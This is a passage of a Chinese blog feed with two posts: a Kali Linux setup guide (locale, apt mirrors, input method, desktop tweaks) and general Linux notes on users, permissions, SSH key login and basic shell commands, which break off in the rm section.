    <content type="html"><![CDATA[<p><strong>kali解压打开默认密码为：kali</strong></p><h1 id="设置中文"><a href="#设置中文" class="headerlink" title="设置中文"></a><strong>设置中文</strong></h1><p>打开Terminal，输入命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg-reconfigure locales</span><br></pre></td></tr></table></figure><p>进入后使用键盘的↑+↓←，到最底部，找到 <code>[ ] zh_CN.UTF-8 UTF-8</code>  ，按空格键选中，再按回车进入下一个页面，再选中 <code>zh_CN.UTF-8</code>作为默认语言，后回车</p><p>等待下载结束后重启即可  </p><h1 id="换源"><a href="#换源" class="headerlink" title="换源"></a><strong>换源</strong></h1><p>因为官方源都是的速度慢，所以选择换国内源</p><p>打开Terminal，输入命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>可选的国内源</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#阿里云源</span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">#中科大源</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">#清华大学源</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.tuna.tsinghua.edu.cn//kali kali-rolling main non-free contrib</span><br><span class="line">#浙大源</span><br><span class="line">deb http://mirrors.zju.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.zju.edu.cn/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure><p>不懂vim语法的按以下步骤来</p><ol><li><p>全选删除原本的内容</p><p>​按<strong>esc键</strong>后，先按 <strong>g  g</strong>（到达顶部），然后再按 <strong>d  G</strong>(区分大小写！！！)</p></li><li><p>复制以上内容，右键粘贴</p></li><li><p>保存退出</p><p>​按<strong>esc键</strong>后，同时按住<strong>shift</strong>键和英文**:**键，再输入wq</p></li></ol><h1 id="系统优化"><a href="#系统优化" class="headerlink" title="系统优化"></a><strong>系统优化</strong></h1><h2 id="1-设置root账户密码"><a href="#1-设置root账户密码" class="headerlink" title="1.设置root账户密码"></a>1.设置root账户密码</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure><h2 id="2-设置禁止休眠"><a href="#2-设置禁止休眠" class="headerlink" title="2.设置禁止休眠"></a>2.设置禁止休眠</h2><ul><li>打开左上角kali图标</li><li>点击<code>settings(设置)</code></li><li>点击进入<code>power Manger(电源管理器)</code></li><li>在<code>Power Manager</code> 选择—&gt; <code>display(显示)</code><br>  把使用电池和插入电源下的依次把<code>Blank after、Put to sleep after和Switch off after</code> 全部设置成为 <code>Never</code></li></ul><h2 id="3-软件数据库更新："><a href="#3-软件数据库更新：" class="headerlink" title="3.软件数据库更新："></a>3.软件数据库更新：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure><h2 id="4-软件更新："><a href="#4-软件更新：" class="headerlink" title="4.软件更新："></a>4.软件更新：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get upgrade</span><br></pre></td></tr></table></figure><h2 id="5-系统更新："><a href="#5-系统更新：" class="headerlink" title="5.系统更新："></a>5.系统更新：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get dist-upgrade</span><br></pre></td></tr></table></figure><h1 id="安装中文输入法"><a href="#安装中文输入法" class="headerlink" title="安装中文输入法"></a><strong>安装中文输入法</strong></h1><ol><li><p>更新包管理器的软件包列表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure></li><li><p>安装<code>fcitx</code>输入法框架：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install fcitx</span><br></pre></td></tr></table></figure></li><li><p>安装<code>fcitx-googlepinyin</code>谷歌拼音输入法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install fcitx-googlepinyin</span><br></pre></td></tr></table></figure></li></ol><p><code>ctrl</code>+<code>space(空格)</code>切换输入法</p><h1 id="界面美化"><a href="#界面美化" class="headerlink" title="界面美化"></a><strong>界面美化</strong></h1><h2 id="1-整体字体放大"><a href="#1-整体字体放大" class="headerlink" title="1.整体字体放大"></a>1.整体字体放大</h2><ul><li>打开左上角kali图标</li><li>点击<strong>设置</strong>进入<strong>外观</strong></li><li>选择<strong>字体</strong>，修改<strong>DPI</strong></li></ul><h2 id="1-桌面图标大小"><a href="#1-桌面图标大小" class="headerlink" title="1.桌面图标大小"></a>1.桌面图标大小</h2><ul><li>桌面<strong>右键</strong>选择<strong>桌面设置</strong></li><li>选择<strong>图标</strong>，调节<strong>图标大小</strong>完成对桌面图标的调节。（这步也可以设置图标下的字体 自定义大小）</li></ul><h2 id="2-菜单栏大小以及位置"><a href="#2-菜单栏大小以及位置" class="headerlink" title="2.菜单栏大小以及位置"></a>2.菜单栏大小以及位置</h2><ul><li>在菜单栏空白处右键—选择<strong>面板</strong>再点击<strong>面板首选项</strong></li><li>打开面板后选择<strong>显示</strong>—<strong>尺寸</strong>—调节<strong>行大小</strong></li><li><strong>关闭锁定面板</strong>，可拖动作用两侧的小点将面板放置于最下侧</li></ul><h2 id="3-终端字体"><a href="#3-终端字体" class="headerlink" title="3.终端字体"></a>3.终端字体</h2><ul><li>打开<strong>终端</strong>再点击左上角<strong>文件</strong>点击<strong>参数设置</strong></li><li>打开<strong>设置界面</strong>，<strong>界面设置</strong>—调节<strong>字体</strong>大小</li></ul><h2 id="4-系统字体"><a href="#4-系统字体" class="headerlink" title="4.系统字体"></a>4.系统字体</h2><ul><li>打开左上角kali图标</li><li>点击<strong>设置</strong>进入<strong>外观</strong></li><li>选择<strong>字体</strong>，修改<strong>默认字体</strong>和<strong>默认等宽字体</strong></li></ul><h2 id="4-窗口字体"><a href="#4-窗口字体" class="headerlink" title="4.窗口字体"></a>4.窗口字体</h2><ul><li>打开左上角kali图标</li><li>点击<strong>设置</strong>进入<strong>窗口管理器</strong></li><li>选择<strong>样式</strong>修改<strong>标题字体</strong></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;kali解压打开默认密码为：kali&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&quot;设置中文&quot;&gt;&lt;a href=&quot;#设置中文&quot; class=&quot;headerlink&quot; title=&quot;设置中文&quot;&gt;&lt;/a&gt;&lt;strong&gt;设置中文&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;打开</summary>
      
    
    
    
    <category term="解决方案" scheme="https://we11s.github.io/categories/%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    
    
    <category term="Tools" scheme="https://we11s.github.io/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>Linux笔记</title>
    <link href="https://we11s.github.io/posts/1406167115/"/>
    <id>https://we11s.github.io/posts/1406167115/</id>
    <published>2023-12-25T14:22:26.000Z</published>
    <updated>2024-01-27T07:53:14.928Z</updated>
    
    <content type="html"><![CDATA[<h1 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a><strong>用户管理</strong></h1><h2 id="创建指令"><a href="#创建指令" class="headerlink" title="创建指令"></a>创建指令</h2><p>通常是<code>useradd</code>或<code>adduser</code></p><ol><li><h3 id="使用useradd命令："><a href="#使用useradd命令：" class="headerlink" title="使用useradd命令："></a>使用<code>useradd</code>命令：</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo useradd 选项 用户名</span><br></pre></td></tr></table></figure><ul><li>选项:<ul><li>-c comment 指定一段注释性描述。</li><li>-d 目录 指定用户主目录（如果已存在）。如果此目录不存在，则同时使用-m选项，可以创建主目录。如：<code>sudo useradd –d  /home/sam -m sam</code></li><li>-g 用户组 指定用户所属的用户组。</li><li>-G 用户组，用户组 指定用户所属的附加组。</li><li>-s Shell文件 指定用户的登录Shell。</li><li>-u 用户号 指定用户的用户号，如果同时有-o选项，则可以重复使用其他用户的标识号。</li></ul></li></ul></li><li><h3 id="使用adduser命令："><a href="#使用adduser命令：" class="headerlink" title="使用adduser命令："></a>使用<code>adduser</code>命令：</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo adduser 用户名</span><br></pre></td></tr></table></figure></li></ol><p>创建用户后，系统会自动为该用户分配一个默认的主目录和用户组。</p><h2 id="设置密码"><a href="#设置密码" class="headerlink" title="设置密码"></a>设置密码</h2><p><code>passwd</code>命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd 选项 用户名</span><br></pre></td></tr></table></figure><p>选项：</p><ul><li>-l 锁定口令，即禁用账号。</li><li>-u 口令解锁。</li><li>-d 使账号无口令。</li><li>-f 强迫用户下次登录时修改口令。</li></ul><h2 id="修改帐号"><a href="#修改帐号" class="headerlink" title="修改帐号"></a>修改帐号</h2><p><code>usermod</code>命令，其格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usermod 选项 用户名</span><br></pre></td></tr></table></figure><p>常用的选项包括<code>-c, -d, -m, -g, -G, -s, -u以及-o等</code>，这些选项的意义与<code>useradd</code>命令中的选项一样，可以为用户指定新的资源值。</p><p>另外，有些系统可以使用选项：<code>-l</code> 新用户名</p><p>这个选项指定一个新的账号，即将原来的用户名改为新的用户名。</p><h2 id="删除帐号"><a href="#删除帐号" class="headerlink" title="删除帐号"></a>删除帐号</h2><p><code>userdel</code>命令，其格式如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">userdel 选项 用户名</span><br></pre></td></tr></table></figure><p>常用的选项是 <code>-r</code>，它的作用是把用户的主目录一起删除。</p><h1 id="用户组管理"><a href="#用户组管理" class="headerlink" title="用户组管理"></a><strong>用户组管理</strong></h1><h2 id="增加用户组"><a href="#增加用户组" class="headerlink" title="增加用户组"></a>增加用户组</h2><p><code>groupadd</code>命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groupadd 选项 用户组</span><br></pre></td></tr></table></figure><p>选项：</p><ul><li>-g GID 指定新用户组的组标识号（GID）。</li><li>-o 一般与-g选项同时使用，表示新用户组的GID可以与系统已有用户组的GID相同。</li></ul><h2 id="删除用户组"><a href="#删除用户组" class="headerlink" title="删除用户组"></a>删除用户组</h2><p><code>groupdel</code>命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groupdel 用户组</span><br></pre></td></tr></table></figure><h2 id="修改用户组"><a href="#修改用户组" class="headerlink" title="修改用户组"></a>修改用户组</h2><p><code>groupmod</code>命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groupmod 选项 用户组</span><br></pre></td></tr></table></figure><p>选项：</p><ul><li>-g GID 为用户组指定新的组标识号。</li><li>-o 与-g选项同时使用，用户组的新GID可以与系统已有用户组的GID相同。</li><li>-n新用户组 将用户组的名字改为新名字</li></ul><h2 id="用户在用户组之间切换"><a href="#用户在用户组之间切换" class="headerlink" title="用户在用户组之间切换"></a>用户在用户组之间切换</h2><p><code>newgrp</code>命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">newgrp root</span><br></pre></td></tr></table></figure><p>（前提条件是root用户组确实是该用户的主组或附加组）这条命令将当前用户切换到root用户组，</p><h1 id="权限控制"><a href="#权限控制" class="headerlink" title="权限控制"></a><strong>权限控制</strong></h1><h2 id="授予用户sudo权限"><a href="#授予用户sudo权限" class="headerlink" title="授予用户sudo权限"></a>授予用户sudo权限</h2><p>用户到sudo用户组：</p><ul><li><p>在某些Linux发行版中，可以将用户添加到sudo用户组来赋予其sudo权限。</p></li><li><p>使用以下命令将用户添加到sudo用户组：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo usermod -aG sudo 用户名</span><br></pre></td></tr></table></figure></li></ul><h2 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h2><p><strong>文件权限位包括读取（read）、写入（write）和执行（execute）权限。</strong></p><ul><li>读取权限（r）允许用户查看文件内容和属性。</li><li>写入权限（w）允许用户修改文件内容和属性。</li><li>执行权限（x）允许用户以可执行文件的形式运行文件（例如，脚本或可执行程序）或进入目录。</li></ul><p>每个文件都有三组权限位，分别对应文件的<strong>所有者、用户组和其他用户</strong>。</p><h3 id="更改文件权限"><a href="#更改文件权限" class="headerlink" title="更改文件权限"></a>更改文件权限</h3><p> <code>chmod</code> 命令可以更改文件的权限</p><h4 id="数字模式："><a href="#数字模式：" class="headerlink" title="数字模式："></a>数字模式：</h4><p>可以使用三个八进制数字（0-7）来表示权限位。每个数字代表一个权限组，分别表示所有者、用户组和其他用户的权限。</p><ul><li>每个权限位用一个数字表示，对应的值为：<ul><li>r：4             w：2               x：1                   -：0</li></ul></li><li>将三个权限位的数字相加，得到一个三位数，例如：<ul><li>rwx：4 + 2 + 1 &#x3D; 7</li><li>rw-：4 + 2 + 0 &#x3D; 6</li><li>r–：4 + 0 + 0 &#x3D; 4</li><li>—：0 + 0 + 0 &#x3D; 0</li></ul></li></ul><h4 id="符号模式："><a href="#符号模式：" class="headerlink" title="符号模式："></a>符号模式：</h4><p>可以使用 <code>+</code>、<code>-</code> 和 <code>=</code> 符号来添加、移除或设置权限。符号前表示用户u（所有者）、g（用户组）、o（其他用户）、a（所有用户），后表示所操作的权限。</p><ol><li>给予读取权限：<ul><li>给予所有者读取权限：<code>chmod u+r 文件名</code></li><li>给予用户组读取权限：<code>chmod g+r 文件名</code></li><li>给予其他用户读取权限：<code>chmod o+r 文件名</code></li><li>给予所有用户（包括所有者、用户组和其他用户）读取权限：<code>chmod a+r 文件名</code></li></ul></li><li>给予写入权限：<ul><li>给予所有者写入权限：<code>chmod u+w 文件名</code></li><li>给予用户组写入权限：<code>chmod g+w 文件名</code></li><li>给予其他用户写入权限：<code>chmod o+w 文件名</code></li><li>给予所有用户写入权限：<code>chmod a+w 文件名</code></li></ul></li><li>给予执行权限：<ul><li>给予所有者执行权限：<code>chmod u+x 文件名</code></li><li>给予用户组执行权限：<code>chmod g+x 文件名</code></li><li>给予其他用户执行权限：<code>chmod o+x 文件名</code></li><li>给予所有用户执行权限：<code>chmod a+x 文件名</code></li></ul></li></ol><h1 id="远程登录"><a href="#远程登录" class="headerlink" title="远程登录"></a><strong>远程登录</strong></h1><p>Linux 系统中是通过 ssh 服务实现的远程登录功能，默认 ssh 服务端口号为 22</p><p>第一种级别（基于口令的安全验证）：只要你知道自己帐号和口令，就可以登录到远程主机。</p><p>第二种级别（基于密钥的安全验证）：你必须为自己创建一对密钥，并把公钥放在需要访问的服务器上。</p><h2 id="密钥连接"><a href="#密钥连接" class="headerlink" title="密钥连接"></a>密钥连接</h2><h3 id="1-生成ssh-key的文件"><a href="#1-生成ssh-key的文件" class="headerlink" title="1.生成ssh key的文件"></a>1.生成ssh key的文件</h3><p>windows 用户可以使用 <strong>WSL</strong>，或使用 <strong>Git Bash</strong>进行执行命令</p><p><code>ssh-keygen</code> 命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen 参数</span><br></pre></td></tr></table></figure><p>可选参数：</p><ul><li><code>-t</code>：指定密钥类型。常见的选项包括 <code>rsa</code>、<code>dsa</code>、<code>ecdsa</code> 和 <code>ed25519</code>。默认为 <code>rsa</code>。</li><li><code>-b</code>：指定密钥位数。默认为 2048 位。常见的选项包括 1024、2048、4096。</li><li><code>-C</code>：添加注释。可以在生成的公钥文件中添加一段注释，用于标识该密钥的用途或所有者等信息。</li><li><code>-f</code>：指定生成的密钥文件名。可以自定义密钥文件的名称和路径。</li><li><code>-N</code>：设置密码短语（passphrase）。可以为私钥文件设置密码短语，以增加安全性。</li><li><code>-q</code>：静默模式。生成密钥时不显示进度或警告信息。</li><li><code>-y</code>：从私钥文件中提取公钥。可以使用私钥文件生成对应的公钥文件。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">XiaoWei@XiaoWEI MINGW64 ~/.ssh</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ssh-keygen -t rsa -b 4096 -f aliyun_rsa</span></span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter passphrase (empty for no passphrase):  //如果不想在之后登录的时候还需要输入密码请直接回车</span><br><span class="line">Enter same passphrase again:   //如果不想在之后登录的时候还需要输入密码请直接回车</span><br><span class="line">Your identification has been saved in aliyun_rsa</span><br><span class="line">Your public key has been saved in aliyun_rsa.pub</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：</p><p>密钥用于鉴权，请谨慎保管。<strong>公钥文件以 .pub 扩展名结尾，可以公开给其他人</strong>，而<strong>没有 .pub 扩展名的私钥文件不要泄露给任何人！</strong></p><h3 id="2-部署公钥到服务器"><a href="#2-部署公钥到服务器" class="headerlink" title="2.部署公钥到服务器"></a>2.部署公钥到服务器</h3><ol><li><p>创建 SSH 目录和授权文件：在目标服务器上，如果尚未存在，请创建 <code>.ssh</code> 目录，并将其权限设置为 <code>700</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p ~/.ssh</span><br><span class="line">chmod 700 ~/.ssh</span><br></pre></td></tr></table></figure></li><li><p>添加公钥到授权文件：将公钥粘贴到服务器上的 <code>~/.ssh/authorized_keys</code> 文件中。如果该文件不存在，请创建它，并将其权限设置为 <code>600</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.ssh/authorized_keys</span><br><span class="line">chmod 600 ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure></li><li><p>保存并退出：保存对 <code>authorized_keys</code> 文件的更改，并退出服务器。</p></li></ol><h3 id="3-更改配置文件"><a href="#3-更改配置文件" class="headerlink" title="3.更改配置文件"></a>3.更改配置文件</h3><p>有些Linux可能默认禁止ssl的密钥登录</p><ol><li><p>SSH 配置文件位于 <code>/etc/ssh/sshd_config</code>，可使用以下命令进行配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vi /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><p>如果您只想更改用户级别的 SSH 配置，可以编辑 <code>~/.ssh/config</code> 文件。</p></li><li><p>在配置文件中，常见的 SSH 配置选项：</p><ul><li><code>Port</code>：指定 SSH 服务器监听的端口号。</li><li><code>PermitRootLogin</code>：允许或禁止使用 root 用户进行 SSH 登录。</li><li><code>PasswordAuthentication</code>：允许或禁止使用密码进行身份验证。</li><li><strong><code>PubkeyAuthentication</code>：允许或禁止使用公钥进行身份验证。</strong></li><li><code>AllowUsers</code> 或 <code>AllowGroups</code>：限制允许登录的用户或组。</li><li><code>DenyUsers</code> 或 <code>DenyGroups</code>：禁止登录的用户或组。</li><li><code>PrintMotd</code>：显示登录时的欢迎信息。</li><li><code>Banner</code>：指定自定义的登录横幅文件。</li></ul></li></ol><h3 id="4-本机ssh的config设置（快捷登录）"><a href="#4-本机ssh的config设置（快捷登录）" class="headerlink" title="4.本机ssh的config设置（快捷登录）"></a>4.本机ssh的config设置（快捷登录）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Host 名称(自己决定，方便输入记忆的)</span><br><span class="line">    HostName 主机名 #172.16.8.152</span><br><span class="line">    User root # SSH 连接的用户名</span><br><span class="line">    # Port 29172 端口 默认22</span><br><span class="line">    # PreferredAuthentications publickey,password  # 选项publickey/password/publickey,password  设置首选的身份验证方法，先尝试公钥验证，然后尝试密码验证</span><br><span class="line">    # IdentityFile ~/.ssh/work_id_rsa  # 使用的身份验证密钥文件路径</span><br><span class="line">    # ForwardAgent yes  # 启用 SSH 代理转发</span><br><span class="line">    # ForwardX11 yes  # 启用 X11 转发</span><br><span class="line">    # Compression yes  # 启用连接压缩</span><br><span class="line">    # StrictHostKeyChecking yes  # 设置主机密钥检查级别为严格检查</span><br><span class="line">    # LogLevel VERBOSE  # 设置 SSH 客户端的日志级别为详细模式</span><br><span class="line">    # ServerAliveInterval 60  # 设置 SSH 连接的保活机制，每60秒发送保活消息</span><br><span class="line">    # ServerAliveCountMax 3  # 设置 SSH 连接的保活机制，最多发送3个保活消息</span><br><span class="line">    # ProxyJump jumpbox  # 使用跳板机（代理主机）访问目标主机</span><br></pre></td></tr></table></figure><h1 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a><strong>软件安装</strong></h1><ol><li><h2 id="Ubuntu-Debian"><a href="#Ubuntu-Debian" class="headerlink" title="Ubuntu&#x2F;Debian:"></a>Ubuntu&#x2F;Debian:</h2><ul><li>使用APT包管理器：<ul><li>安装软件：<code>sudo apt-get install 软件名称</code></li><li>卸载软件：<code>sudo apt-get remove 软件名称</code></li><li>更新软件包列表：<code>sudo apt-get update</code></li><li>升级已安装的软件包：<code>sudo apt-get upgrade</code></li></ul></li></ul></li><li><h2 id="CentOS-RHEL-Fedora"><a href="#CentOS-RHEL-Fedora" class="headerlink" title="CentOS&#x2F;RHEL&#x2F;Fedora:"></a>CentOS&#x2F;RHEL&#x2F;Fedora:</h2><ul><li>使用YUM包管理器：<ul><li>安装软件：<code>sudo yum install 软件名称</code></li><li>卸载软件：<code>sudo yum remove 软件名称</code></li><li>更新软件包列表：<code>sudo yum update</code></li><li>升级已安装的软件包：<code>sudo yum upgrade</code></li></ul></li></ul></li><li><h2 id="Alpine-Linux"><a href="#Alpine-Linux" class="headerlink" title="Alpine Linux:"></a>Alpine Linux:</h2><ul><li><p>使用apk包管理器：</p><ul><li><p>安装软件：<code>apk add 软件名称</code></p></li><li><p>卸载软件：<code>apk del 软件名称</code></p></li><li><p>更新软件包列表：<code>apk update</code></p></li><li><p>升级已安装的软件包：<code>apk upgrade</code></p></li></ul></li></ul></li></ol><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a><strong>常用命令</strong></h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="1-目录符号"><a href="#1-目录符号" class="headerlink" title="1.目录符号"></a>1.目录符号</h3><p> <code>/</code> 表示从 <strong>根目录</strong></p><p><code>~</code>表示从 <strong>家目录</strong>(即&#x2F;home&#x2F;<em>用户名</em>，root用户为<code>/root</code>)</p><p><code>.</code> 代表当前目录</p><p><code>..</code> 代表上一级目录</p><h3 id="2-绝对目录与相对目录"><a href="#2-绝对目录与相对目录" class="headerlink" title="2.绝对目录与相对目录"></a>2.绝对目录与相对目录</h3><p><strong>相对路径</strong> 在输入路径时，使用<code>.</code>或者<code>..</code>，表示相对 当前目录 所在的目录位置 </p><p><strong>绝对路径</strong> 在输入路径时，最前面是 &#x2F; 或者 ~，表示从 <strong>根目录&#x2F;家目录</strong> 开始的具体目录位置，特点：需要写入完整地址</p><h3 id="3-和-重定向-命令"><a href="#3-和-重定向-命令" class="headerlink" title="3.&gt; 和 &gt;&gt;重定向 命令"></a>3.<code>&gt;</code> 和 <code>&gt;&gt;</code>重定向 命令</h3><p>功能：将命令执行结果<strong>重定向</strong>到一个文件，将本应显示在终端上的内容 输出或追加 到指定文件中</p><p> <code>&gt;</code> 表示输出，会覆盖文件原有的内容 </p><p><code>&gt;&gt;</code> 表示追加，会将内容追加到已有文件的末尾</p><h3 id="4-管道符"><a href="#4-管道符" class="headerlink" title="4.|管道符"></a>4.<code>|</code>管道符</h3><ul><li>Linux 允许将 一个命令的输出 可以通过管道<code>|</code> 做为 另一个命令的输入</li><li>这里 | 的左右分为两端， 左端塞东西（写），右端取东西（读）</li></ul><h2 id="pwd-命令"><a href="#pwd-命令" class="headerlink" title="pwd 命令"></a><code>pwd</code> 命令</h2><p>对应单词：print working directory</p><p>功能：打印当前工作目录</p><h2 id="ls-命令"><a href="#ls-命令" class="headerlink" title="ls 命令"></a><code>ls</code> 命令</h2><p>对应单词：list</p><p>功能：<strong>列出目录的内容</strong>或者使用通配符<strong>列出文件名匹配的文件</strong></p><p>格式:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls [参数]</span><br></pre></td></tr></table></figure><p>可选参数</p><table><thead><tr><th>-a</th><th>显示指定目录下所有目录与文件，包括隐藏文件</th></tr></thead><tbody><tr><td>-l</td><td>以列表方式显示文件的详细信息</td></tr><tr><td>-h</td><td>配合 -l 以人性化的方式显示文件大小</td></tr></tbody></table><p>注意：以 <code>.</code> 开头的文件为隐藏文件，需要用 -a 参数才能显示</p><h2 id="find-命令"><a href="#find-命令" class="headerlink" title="find 命令"></a><code>find</code> 命令</h2><p>对应单词：find</p><p>功能：指定目录及其子目录下查找文件和目录</p><p>格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find [路径] [匹配条件] [动作]</span><br></pre></td></tr></table></figure><p>常用的匹配条件：</p><table><thead><tr><th>可选匹配条件</th><th>作用</th></tr></thead><tbody><tr><td>-name</td><td>按文件名查找，支持使用通配符 <code>*</code> 和 <code>?</code></td></tr><tr><td>-type</td><td>按文件类型查找，可以是 <code>f</code>（普通文件）、<code>d</code>（目录）、<code>l</code>（符号链接）等。</td></tr><tr><td>-size[+-]</td><td>按文件大小查找，支持使用 <code>+</code> 或 <code>-</code> 表示大于或小于指定大小，单位可以是 <code>c</code>（字节）、<code>w</code>（字数）、<code>b</code>（块数）、<code>k</code>（KB）、<code>M</code>（MB）或 <code>G</code>（GB）。</td></tr><tr><td>-mtime</td><td>按修改时间查找，支持使用 <code>+</code> 或 <code>-</code> 表示在指定天数前或后，days 是一个整数表示天数。</td></tr><tr><td>-user</td><td>按文件所有者查找。</td></tr><tr><td>-group</td><td>按文件所属组查找。</td></tr></tbody></table><h2 id="cd-命令"><a href="#cd-命令" class="headerlink" title="cd 命令"></a><code>cd</code> 命令</h2><p>对应单词：change directory</p><p>功能：<strong>更改当前的工作目录</strong></p><p>格式:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd 目录</span><br></pre></td></tr></table></figure><p><code>cd</code>搭配符号</p><table><thead><tr><th align="left">命令</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left"><code>cd</code>  &#x2F;<code>cd ~</code></td><td align="left">切换到当前用户的主目录(&#x2F;home&#x2F;用户目录)</td></tr><tr><td align="left">cd .</td><td align="left">保持在当前目录不变</td></tr><tr><td align="left">cd ..</td><td align="left">切换到上级目录</td></tr><tr><td align="left">cd –</td><td align="left">可以在最近两次工作目录之间来回切换</td></tr></tbody></table><h2 id="touch命令"><a href="#touch命令" class="headerlink" title="touch命令"></a><code>touch</code>命令</h2><p>功能：</p><ul><li>如果文件不存在，可以创建一个空白文件 </li><li>如果文件已经存在，可以修改文件的末次修改日期</li></ul><h2 id="mkdir命令"><a href="#mkdir命令" class="headerlink" title="mkdir命令"></a><code>mkdir</code>命令</h2><p>对应单词：make directory</p><p>功能：创建一个新的目录</p><table><thead><tr><th align="left">选项</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left">-p</td><td align="left">创建多级目录<br />需要创建一个目录的同时，也需要创建其上级目录（如果上级目录不存在）</td></tr></tbody></table><p>注意：新建目录的名称 不能与当前目录中 已有的目录同名</p><h2 id="rm命令"><a href="#rm命令" class="headerlink" title="rm命令"></a><code>rm</code>命令</h2><p>对应单词：remove</p><p>功能：删除文件或目录</p><table><thead><tr><th align="left">可选参数</th><th 